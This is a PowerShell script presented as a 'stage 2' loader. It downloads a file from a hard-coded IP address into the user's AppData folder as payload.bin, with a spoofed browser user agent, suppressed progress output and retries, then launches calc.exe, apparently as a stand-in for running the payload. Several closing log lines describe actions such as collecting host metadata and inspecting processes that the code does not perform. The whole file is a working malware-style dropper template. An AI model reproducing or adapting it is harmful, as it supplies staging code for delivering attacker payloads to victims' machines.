<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://198.51.100.222/assets/update.dat',
    [string]$OutputPath = "$env:APPDATA\payload.bin",
    [string]$LogPath = "$env:TEMP\report.txt",
    [string]$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$RequestTimeout = 128,
    [int]$MaxAttempts = 2,
    [int]$BackoffSeconds = 10
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ""
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$RetryCount = 2,
        [int]$RetryDelay = 10,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

Write-StageLog -Message "Starting stage 2 download"
$ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $RemoteUrl
$StageResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $OutputPath -RetryCount $MaxAttempts -RetryDelay $BackoffSeconds -UserAgent $RequestAgent
if ($StageResult) {
    Write-StageLog -Message "Stage 2 downloaded"
    Start-Process -FilePath "calc.exe"
}
else {
    Write-Warning "Stage 2 transfer did not complete"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $RemoteUrl
    Destination = $OutputPath
    RetryCount = $MaxAttempts
    TimeoutSec = $RequestTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Starting workflow"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Reading configuration values"
Write-Verbose "Collecting host metadata"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Preparing working directory"
Write-Verbose "Stage handoff finished"
Write-Verbose "Applying operation timeout"
Write-Verbose "Inspecting process list"
Write-Verbose "Exporting operation report"
Write-Verbose "stage marker 17 reached"
